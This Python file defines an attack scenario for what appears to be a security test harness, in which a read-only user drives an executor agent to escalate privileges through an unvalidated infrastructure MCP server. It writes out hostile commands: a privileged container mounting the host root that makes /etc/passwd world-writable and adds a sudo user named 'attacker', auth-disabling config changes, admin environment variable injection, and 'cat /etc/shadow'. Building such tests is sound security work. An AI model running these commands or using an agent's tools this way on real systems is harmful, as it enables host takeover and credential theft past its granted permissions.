"""
Scenario 13: Privilege Escalation via Infrastructure

Category: Infrastructure
Difficulty: Hard
Threats: IF-01, IF-02, IF-05, T-05

This scenario exploits the Infra MCP's lack of validation to escalate privileges
through deployment manipulation, config tampering, and environment modification.
"""

from uuid import uuid4
from loguru import logger

from src.scenarios import AttackScenario, AttackStep, Criterion, ScenarioCategory, ScenarioDifficulty
from src.database.connection import get_db
from src.database.queries import create_identity, get_audit_logs
from src.mcps.infra_mcp import InfraMCPServer
from src.identity.context import IdentityContext


# Shared state for scenario
scenario_state = {
    "low_priv_user_id": None,
    "executor_id": None,
    "malicious_deployment_id": None,
    "config_changes": [],
    "env_modifications": [],
    "escalation_successful": False,
}


def setup_scenario():
    """Set up the scenario with low-privilege user and executor."""
    logger.info("Setting up Scenario 13: Privilege Escalation via Infrastructure")
    
    with get_db() as db:
        # Create low-privilege user
        user = create_identity(
            db,
            identity_type="user",
            name="LowPrivUser",
            email="lowpriv@test.com",
            permissions=["read"]  # Only read permission
        )
        scenario_state["low_priv_user_id"] = user.id
        
        # Create executor agent
        executor = create_identity(
            db,
            identity_type="agent",
            name="executor-001",
            permissions=["read", "write", "execute", "deploy"]
        )
        scenario_state["executor_id"] = executor.id
    
    logger.info("✓ Setup complete: Low-privilege user and Executor created")


def step1_deploy_privilege_escalation_service():
    """Deploy a service that grants elevated privileges."""
    infra_mcp = InfraMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["low_priv_user_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["low_priv_user_id"], scenario_state["executor_id"]],
        permissions={"read"},  # User only has read permission
    )
    
    # VULNERABILITY: IF-01, IF-05 - Deployment manipulation and privilege escalation
    # Deploy a service that runs with elevated privileges
    result = infra_mcp.deploy_service(
        service_name="privilege-escalator",
        config={
            "image": "ubuntu:latest",
            "command": "chmod 777 /etc/passwd && useradd -m -G sudo attacker",
            "privileged": True,  # Run with elevated privileges
            "volumes": ["/:/host"],  # Mount host filesystem
        },
        identity_context=identity_ctx
    )
    
    if result.get("success"):
        scenario_state["malicious_deployment_id"] = result.get("deployment_id")
    
    logger.info(f"Deployed privilege escalation service: {scenario_state['malicious_deployment_id']}")
    return result.get("success", False)


def step2_modify_auth_config():
    """Modify authentication configuration to bypass checks."""
    infra_mcp = InfraMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["low_priv_user_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["low_priv_user_id"], scenario_state["executor_id"]],
        permissions={"read"},
    )
    
    # VULNERABILITY: IF-02 - Config tampering
    # Modify authentication config to disable permission checks
    config_changes = [
        ("auth.enabled", "false"),
        ("auth.require_admin", "false"),
        ("permissions.enforce", "false"),
    ]
    
    for key, value in config_changes:
        result = infra_mcp.modify_config(
            config_key=key,
            config_value=value,
            identity_context=identity_ctx
        )
        if result.get("success"):
            scenario_state["config_changes"].append((key, value))
    
    logger.info(f"Modified {len(scenario_state['config_changes'])} auth configs")
    return len(scenario_state["config_changes"]) >= 2


def step3_inject_admin_env_vars():
    """Inject environment variables to grant admin privileges."""
    infra_mcp = InfraMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["low_priv_user_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["low_priv_user_id"], scenario_state["executor_id"]],
        permissions={"read"},
    )
    
    # VULNERABILITY: IF-03, IF-05 - Environment variable manipulation for privilege escalation
    # Inject env vars that grant admin privileges
    env_vars = [
        ("USER_ROLE", "admin"),
        ("USER_PERMISSIONS", "admin,read,write,delete,execute"),
        ("BYPASS_AUTH", "true"),
    ]
    
    for var_name, var_value in env_vars:
        result = infra_mcp.write_env(
            var_name=var_name,
            var_value=var_value,
            identity_context=identity_ctx
        )
        if result.get("success"):
            scenario_state["env_modifications"].append((var_name, var_value))
    
    logger.info(f"Injected {len(scenario_state['env_modifications'])} admin env vars")
    return len(scenario_state["env_modifications"]) >= 2


def step4_execute_privileged_command():
    """Execute a command that requires admin privileges."""
    infra_mcp = InfraMCPServer()
    
    identity_ctx = IdentityContext(
        user_id=scenario_state["low_priv_user_id"],
        agent_id=scenario_state["executor_id"],
        delegation_chain=[scenario_state["low_priv_user_id"], scenario_state["executor_id"]],
        permissions={"read"},
    )
    
    # VULNERABILITY: IF-02, T-05 - Command execution with escalated privileges
    # Execute admin-level command
    result = infra_mcp.execute_command(
        command="cat /etc/shadow",  # Requires root/admin privileges
        identity_context=identity_ctx
    )
    
    logger.info(f"Executed privileged command: {result.get('output', '')[:50]}")
    return result.get("success", False)


def step5_verify_privilege_escalation():
    """Verify that privilege escalation was successful."""
    with get_db() as db:
        # Check if user still has only read permission
        result = db.execute(
            "SELECT permissions FROM identities WHERE id = %s",
            (scenario_state["low_priv_user_id"],)
        )
        row = result.fetchone()
        
        if row:
            permissions = row[0]
            logger.info(f"User permissions: {permissions}")
            
            # Check if escalation artifacts exist
            has_deployment = scenario_state["malicious_deployment_id"] is not None
            has_config_changes = len(scenario_state["config_changes"]) >= 2
            has_env_mods = len(scenario_state["env_modifications"]) >= 2
            
            scenario_state["escalation_successful"] = has_deployment and has_config_changes and has_env_mods
            return scenario_state["escalation_successful"]
        
        return False


def criterion_malicious_service_deployed():
    """Check if privilege escalation service was deployed."""
    return scenario_state["malicious_deployment_id"] is not None


def criterion_auth_config_disabled():
    """Check if authentication config was disabled."""
    return len(scenario_state["config_changes"]) >= 2


def criterion_admin_env_vars_injected():
    """Check if admin environment variables were injected."""
    return len(scenario_state["env_modifications"]) >= 2


def evidence_deployment():
    """Show evidence of malicious deployment."""
    if not scenario_state["malicious_deployment_id"]:
        return "No deployment"
    return f"Deployment ID: {scenario_state['malicious_deployment_id']}, config: privileged=True, volumes=['/:/host']"


def evidence_config_changes():
    """Show evidence of config changes."""
    if not scenario_state["config_changes"]:
        return "No config changes"
    return f"Config changes: {scenario_state['config_changes']}"


def evidence_env_modifications():
    """Show evidence of environment modifications."""
    if not scenario_state["env_modifications"]:
        return "No env modifications"
    return f"Env modifications: {scenario_state['env_modifications']}"


def capture_state_before():
    """Capture system state before attack."""
    with get_db() as db:
        result = db.execute(
            "SELECT permissions FROM identities WHERE id = %s",
            (scenario_state["low_priv_user_id"],)
        )
        row = result.fetchone()
        permissions = row[0] if row else []
        
        return {
            "user_id": scenario_state["low_priv_user_id"],
            "user_permissions": permissions,
            "executor_id": scenario_state["executor_id"],
        }


def capture_state_after():
    """Capture system state after attack."""
    with get_db() as db:
        result = db.execute(
            "SELECT permissions FROM identities WHERE id = %s",
            (scenario_state["low_priv_user_id"],)
        )
        row = result.fetchone()
        permissions = row[0] if row else []
        
        return {
            "user_id": scenario_state["low_priv_user_id"],
            "user_permissions": permissions,  # Still only 'read'
            "executor_id": scenario_state["executor_id"],
            "malicious_deployment": scenario_state["malicious_deployment_id"],
            "config_changes": len(scenario_state["config_changes"]),
            "env_modifications": len(scenario_state["env_modifications"]),
            "escalation_successful": scenario_state["escalation_successful"],
        }


def create_scenario() -> AttackScenario:
    """Create Scenario 13: Privilege Escalation via Infrastructure."""
    return AttackScenario(
        id="S13",
        name="Privilege Escalation via Infrastructure",
        category=ScenarioCategory.INFRASTRUCTURE,
        difficulty=ScenarioDifficulty.HARD,
        description=(
            "Exploit the Infra MCP's lack of validation to escalate privileges through "
            "deployment manipulation, config tampering, and environment modification, "
            "allowing a low-privilege user to gain admin-level access."
        ),
        threat_ids=["IF-01", "IF-02", "IF-05", "T-05"],
        
        # Setup
        setup=setup_scenario,
        
        # Attack steps
        attack_steps=[
            AttackStep(
                description="Deploy service with elevated privileges",
                action=step1_deploy_privilege_escalation_service,
                expected_outcome="Privileged service deployed",
                failure_message="Failed to deploy privileged service"
            ),
            AttackStep(
                description="Modify authentication config to bypass checks",
                action=step2_modify_auth_config,
                expected_outcome="Auth config disabled",
                failure_message="Failed to modify auth config"
            ),
            AttackStep(
                description="Inject admin environment variables",
                action=step3_inject_admin_env_vars,
                expected_outcome="Admin env vars injected",
                failure_message="Failed to inject admin env vars"
            ),
            AttackStep(
                description="Execute privileged command",
                action=step4_execute_privileged_command,
                expected_outcome="Privileged command executed",
                failure_message="Failed to execute privileged command"
            ),
            AttackStep(
                description="Verify privilege escalation success",
                action=step5_verify_privilege_escalation,
                expected_outcome="Privilege escalation verified",
                failure_message="Privilege escalation verification failed"
            ),
        ],
        
        # Success criteria
        success_criteria=[
            Criterion(
                description="Malicious service deployed with elevated privileges",
                check=criterion_malicious_service_deployed,
                evidence=evidence_deployment
            ),
            Criterion(
                description="Authentication config disabled",
                check=criterion_auth_config_disabled,
                evidence=evidence_config_changes
            ),
            Criterion(
                description="Admin environment variables injected",
                check=criterion_admin_env_vars_injected,
                evidence=evidence_env_modifications
            ),
        ],
        
        # Observability
        state_before=capture_state_before,
        state_after=capture_state_after,
        observable_changes=[
            "User with only 'read' permission deployed privileged service",
            "Service runs with privileged=True and host filesystem mounted",
            "Authentication config disabled (auth.enabled=false)",
            "Admin environment variables injected (USER_ROLE=admin)",
            "Privileged command executed (cat /etc/shadow)",
            "User's database permissions unchanged but effective privileges escalated",
            "No validation on deployment, config, or env modifications"
        ],
        
        # Metadata
        agents_involved=["Executor"],
        mcps_involved=["Infra MCP"],
        estimated_duration=55,
    )
